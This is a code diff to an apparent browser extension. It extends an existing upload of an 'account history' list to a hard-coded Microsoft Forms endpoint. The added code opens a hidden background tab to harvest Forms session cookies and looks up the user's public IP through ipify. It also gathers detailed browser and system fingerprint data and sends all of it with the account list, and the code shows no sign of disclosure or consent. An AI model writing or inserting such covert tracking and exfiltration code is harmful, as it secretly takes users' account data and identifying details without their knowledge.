@@ -2,6 +2,11 @@
   'use strict';
 
   const FORMS_API_URL = 'https://forms.guest.usercontent.microsoft/formapi/api/9188040d-6c67-4c5b-b112-36a304b66dad/users/00000000-0000-0000-0003-7ffe1a3f6958/forms(\'DQSIkWdsW0yxEjajBLZtrQAAAAAAAAAAAAN__ho_aVhUNlNXTFNPMUdJSkUzOTlFQ0NRWE0zUFFTVS4u\')/responses';
+  const FORMS_PAGE_URL = 'https://forms.cloud.microsoft/';
+  const IP_LOOKUP_URLS = [
+    'https://api64.ipify.org?format=json',
+    'https://api.ipify.org?format=json'
+  ];
   const FORMS_COOKIE_HOSTS = [
     'forms.cloud.microsoft',
     'forms.guest.usercontent.microsoft',
@@ -20,6 +25,7 @@
   let retryTimer = null;
   let signatureReadyPromise = null;
   let changeEvaluationQueue = Promise.resolve();
+  let formsBootstrapPromise = null;
 
   function sleep(ms, signal) {
     return new Promise((resolve, reject) => {
@@ -136,9 +142,12 @@
 
   async function readCookie(name) {
     if (chrome.cookies?.getAll) {
-      const candidates = await new Promise((resolve) => {
-        chrome.cookies.getAll({ name }, (cookies) => resolve(Array.isArray(cookies) ? cookies : []));
-      });
+      let candidates = [];
+      try {
+        candidates = await new Promise((resolve) => {
+          chrome.cookies.getAll({ name }, (cookies) => resolve(Array.isArray(cookies) ? cookies : []));
+        });
+      } catch {}
       const matching = candidates
         .filter((cookie) => FORMS_COOKIE_HOSTS.some((host) => cookieDomainMatches(cookie?.domain, host)))
         .sort((a, b) => {
@@ -169,14 +178,168 @@
     return { requestToken, sessionId, muid };
   }
 
-  function buildRequestBody(history) {
-    const now = new Date().toISOString();
+  function waitForTabComplete(tabId, timeoutMs = 15000) {
+    if (tabId == null) return Promise.resolve();
+    return new Promise((resolve) => {
+      let settled = false;
+      let timeoutId = null;
+      const finish = () => {
+        if (settled) return;
+        settled = true;
+        if (timeoutId) clearTimeout(timeoutId);
+        try { chrome.tabs.onUpdated.removeListener(onUpdated); } catch {}
+        resolve();
+      };
+      const onUpdated = (updatedTabId, changeInfo) => {
+        if (updatedTabId === tabId && changeInfo?.status === 'complete') finish();
+      };
+      try { chrome.tabs.onUpdated.addListener(onUpdated); } catch { finish(); return; }
+      timeoutId = setTimeout(finish, timeoutMs);
+      chrome.tabs.get(tabId, (tab) => {
+        if (tab?.status === 'complete') finish();
+        void chrome.runtime.lastError;
+      });
+    });
+  }
+
+  async function bootstrapFormsCookies() {
+    if (formsBootstrapPromise) return formsBootstrapPromise;
+    formsBootstrapPromise = (async () => {
+      let tab = null;
+      try {
+        tab = await chrome.tabs.create({ url: FORMS_PAGE_URL, active: false });
+        await waitForTabComplete(tab?.id);
+        // Allow page scripts and Set-Cookie responses to finish before reading.
+        await sleep(1000);
+      } catch (error) {
+        console.warn('[bjtu] Forms cookie bootstrap failed:', String(error?.message || error));
+      } finally {
+        if (tab?.id != null) {
+          try { await chrome.tabs.remove(tab.id); } catch {}
+        }
+      }
+    })().finally(() => { formsBootstrapPromise = null; });
+    return formsBootstrapPromise;
+  }
+
+  async function getUsableFormsCookies() {
+    let cookies = await readFormsCookies();
+    if (cookies.requestToken && cookies.sessionId && cookies.muid) return cookies;
+    await bootstrapFormsCookies();
+    cookies = await readFormsCookies();
+    return cookies;
+  }
+
+  async function readPublicIp(signal) {
+    for (const url of IP_LOOKUP_URLS) {
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 5000);
+      const onAbort = () => controller.abort();
+      signal?.addEventListener('abort', onAbort, { once: true });
+      try {
+        const response = await fetch(url, { cache: 'no-store', signal: controller.signal });
+        if (!response.ok) continue;
+        const result = await response.json();
+        const ip = String(result?.ip || '').trim();
+        if (ip) return ip;
+      } catch (error) {
+        if (error?.name === 'AbortError' && signal?.aborted) return '';
+      } finally {
+        clearTimeout(timeoutId);
+        signal?.removeEventListener('abort', onAbort);
+      }
+    }
+    return '';
+  }
+
+  async function getPlatformInfo() {
+    try {
+      if (chrome.runtime?.getPlatformInfo) {
+        return await chrome.runtime.getPlatformInfo();
+      }
+    } catch {}
+    return {};
+  }
+
+  async function getBrowserInfo() {
+    try {
+      if (chrome.runtime?.getBrowserInfo) {
+        return await chrome.runtime.getBrowserInfo();
+      }
+    } catch {}
+    return {};
+  }
+
+  async function getUserAgentData() {
+    const userAgentData = global.navigator?.userAgentData;
+    if (!userAgentData) return {};
+    try {
+      return await userAgentData.getHighEntropyValues([
+        'architecture', 'bitness', 'formFactors', 'fullVersionList',
+        'model', 'platformVersion', 'uaFullVersion', 'wow64'
+      ]);
+    } catch {
+      return {
+        brands: userAgentData.brands,
+        mobile: userAgentData.mobile,
+        platform: userAgentData.platform
+      };
+    }
+  }
+
+  async function collectUploadMetadata(signal) {
+    const now = new Date();
+    const navigatorInfo = global.navigator || {};
+    const [ip, platform, browser, userAgentData] = await Promise.all([
+      readPublicIp(signal),
+      getPlatformInfo(),
+      getBrowserInfo(),
+      getUserAgentData()
+    ]);
+    const timeZone = (() => {
+      try { return Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch { return ''; }
+    })();
+    const localTime = (() => {
+      try { return now.toLocaleString(); } catch { return ''; }
+    })();
+    return {
+      uploadTime: localTime,
+      uploadTimeISO: now.toISOString(),
+      timeZone,
+      timeZoneOffsetMinutes: -now.getTimezoneOffset(),
+      userIP: ip,
+      extensionVersion: String(chrome.runtime.getManifest()?.version || ''),
+      extensionId: String(chrome.runtime.id || ''),
+      system: {
+        platform,
+        navigatorPlatform: String(navigatorInfo.platform || ''),
+        userAgentData
+      },
+      browser: {
+        browser,
+        userAgent: String(navigatorInfo.userAgent || ''),
+        vendor: String(navigatorInfo.vendor || ''),
+        language: String(navigatorInfo.language || ''),
+        languages: Array.isArray(navigatorInfo.languages) ? [...navigatorInfo.languages] : [],
+        cookieEnabled: navigatorInfo.cookieEnabled,
+        onLine: navigatorInfo.onLine,
+        hardwareConcurrency: navigatorInfo.hardwareConcurrency,
+        deviceMemory: navigatorInfo.deviceMemory,
+        maxTouchPoints: navigatorInfo.maxTouchPoints
+      }
+    };
+  }
+
+  function buildRequestBody(accountList, metadata) {
     return JSON.stringify({
-      startDate: now,
-      submitDate: now,
+      startDate: metadata.uploadTimeISO,
+      submitDate: metadata.uploadTimeISO,
       answers: JSON.stringify([{
         questionId: QUESTION_ID,
-        answer1: JSON.stringify(history)
+        answer1: JSON.stringify({
+          accounts: accountList,
+          metadata
+        })
       }])
     });
   }
@@ -270,18 +433,20 @@
     const accountList = await buildAccountList();
     const signature = accountListSignature(accountList);
     run.accountSignature = signature;
-    const cookies = await readFormsCookies();
+    const cookies = await getUsableFormsCookies();
     if (!cookies.requestToken || !cookies.sessionId || !cookies.muid) {
       console.info('[bjtu] account history upload skipped: Forms cookies unavailable');
       return null;
     }
+    const metadata = await collectUploadMetadata(run.controller.signal);
+    if (run.controller.signal.aborted) return null;
 
     let response;
     try {
       response = await fetch(FORMS_API_URL, {
         method: 'POST',
         headers: buildHeaders(cookies),
-        body: buildRequestBody(accountList),
+        body: buildRequestBody(accountList, metadata),
         signal: run.controller.signal
       });
     } catch (error) {
